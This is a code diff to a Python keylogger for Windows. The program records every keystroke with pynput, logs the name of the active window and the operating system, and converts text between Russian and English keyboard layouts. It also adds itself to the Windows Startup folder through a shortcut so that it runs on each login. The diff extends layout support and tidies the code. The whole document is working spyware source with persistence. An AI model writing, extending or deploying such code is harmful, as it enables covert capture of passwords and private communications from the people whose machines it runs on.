@@ -6,6 +6,7 @@ import os.path
 
 from ctypes import *
 from datetime import datetime
+from pynput import keyboard
 from pynput.keyboard import Key, Listener
 from win32com.client import Dispatch
 
@@ -13,13 +14,19 @@ user32 = windll.user32
 USER_NAME = getpass.getuser()
 name_last_active_window = ""
 file_path = os.path.dirname(os.path.realpath(__file__))
+if not os.path.exists("%s\logs" % file_path):
+    os.mkdir("%s\logs" % file_path)
 path = r"%s\logs" % file_path
 num_files = len([f for f in os.listdir(path)
-                if os.path.isfile(os.path.join(path, f))])
+                 if os.path.isfile(os.path.join(path, f))])
+
+COMBINATION = {keyboard.Key.ctrl}
+current = set()
 
 hwnd = user32.GetForegroundWindow()
 threadID = user32.GetWindowThreadProcessId(hwnd, None)
 StartLang = user32.GetKeyboardLayout(threadID)
+print(StartLang)
 
 eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
 rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
@@ -40,12 +47,12 @@ def add_to_startup():
     path = os.path.join(startup_path, "start.lnk")
     file_path = os.path.dirname(os.path.realpath(__file__))
     target = r"%s\start.vbs" % file_path
-    wDir = file_path
+    w_dir = file_path
     icon = r"%s\start.vbs" % file_path
     shell = Dispatch('WScript.Shell')
     shortcut = shell.CreateShortCut(path)
     shortcut.Targetpath = target
-    shortcut.WorkingDirectory = wDir
+    shortcut.WorkingDirectory = w_dir
     shortcut.IconLocation = icon
     shortcut.save()
 
@@ -79,16 +86,17 @@ def write_file(key):
 
     name_last_active_window = active_window
     hwnd = user32.GetForegroundWindow()
-    threadID = user32.GetWindowThreadProcessId(hwnd, None)
-    CodeLang = user32.GetKeyboardLayout(threadID)
+    thread_id = user32.GetWindowThreadProcessId(hwnd, None)
+    code_lang = user32.GetKeyboardLayout(thread_id)
     k = str(key).replace("'", "")
-    # 68748313 russian
-    # 67706880 english
-    if StartLang == 67706880:
-        if CodeLang == 68748313 and k.find("Key") == -1:
+    ru_lang = [68748313, 68758528, 68757504, 68749337, 68756480]
+    en_lang = [67699721, 134809609, 67707913, 67708937, 67701769, 1074348041, 67702793, 403249161,
+               67706889, 67716105, 67703817, 67712009, 67717129, 67705865, 67709961, 67710985, 67718153]
+    if StartLang in en_lang:
+        if code_lang in ru_lang and k.find("Key") == -1:
             k = change_en_ru(k)
-    elif StartLang == 68748313:
-        if CodeLang == 67706880 and k.find("Key") == -1:
+    elif StartLang in ru_lang:
+        if code_lang in en_lang and k.find("Key") == -1:
             k = change_ru_en(k)
     now_time = datetime.now().time().replace(microsecond=0)
     f.write(str(now_time))
@@ -104,14 +112,15 @@ def on_release(key):
 
 def main():
     add_to_startup()
-    # add_to_startup(file_path="")
+    OS = platform.platform()
     file = r"%s\log%s.txt" % (path, (num_files + 1))
     f = open(file, "w", encoding='utf-8')
     f.write("Operating system: ")
-    f.write(platform.platform())
+    f.write(OS)
     f.write("\n")
     now_data = datetime.now().date()
     f.write(str(now_data))
+    f.close()
 
 
 if __name__ == "__main__":
